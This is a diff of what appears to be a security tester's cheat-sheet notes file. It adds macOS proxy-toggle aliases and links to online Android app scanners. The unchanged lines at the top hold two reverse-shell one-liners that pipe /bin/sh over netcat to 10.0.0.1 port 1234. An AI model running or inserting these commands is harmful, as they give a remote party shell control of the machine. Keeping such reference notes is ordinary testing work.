@@ -10,3 +10,19 @@ nc -e /bin/sh 10.0.0.1 1234
 
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f   
 ____________________________________________________________________________
+
+Bash alias for enabling HTTPS and HTTP proxy
+
+alias proxy-on="sudo networksetup -setsecurewebproxy 'Wi-Fi' 127.0.0.1 9090 && sudo networksetup -setwebproxy 'Wi-Fi' 127.0.0.1 9090"
+alias proxy-off="sudo networksetup -setsecurewebproxystate 'Wi-Fi' off && sudo networksetup -setwebproxystate 'Wi-Fi' off"
+
+____________________________________________________________________________
+
+
+Online Android App Scanner 
+
+https://www.htbridge.com/mobile/?id=JebdfnGU
+https://apkscan.nviso.be
+https://www.androlyzer.com
+
+____________________________________________________________________________
